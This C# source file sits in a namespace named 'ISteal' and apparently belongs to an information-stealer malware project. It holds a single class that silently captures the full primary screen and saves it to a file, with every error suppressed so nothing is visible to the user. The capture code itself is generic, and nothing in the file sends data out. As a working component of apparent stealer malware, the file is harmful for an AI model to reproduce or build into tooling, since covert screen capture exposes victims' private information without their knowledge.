using System.Drawing;
using System.Windows.Forms;
using System;

namespace ISteal.New
{
    internal class ScreenShotWindow
    {
        public static void Take(string SaveFile)
        {
            try
            {
                using (Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
                {
                    try
                    {
                        using (Graphics g = Graphics.FromImage(bmp))
                        {
                            g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                            bmp.Save(SaveFile);
                        }
                    }
                    catch (Exception) { }
                }
            }
            catch (Exception) { }
        }
    }
}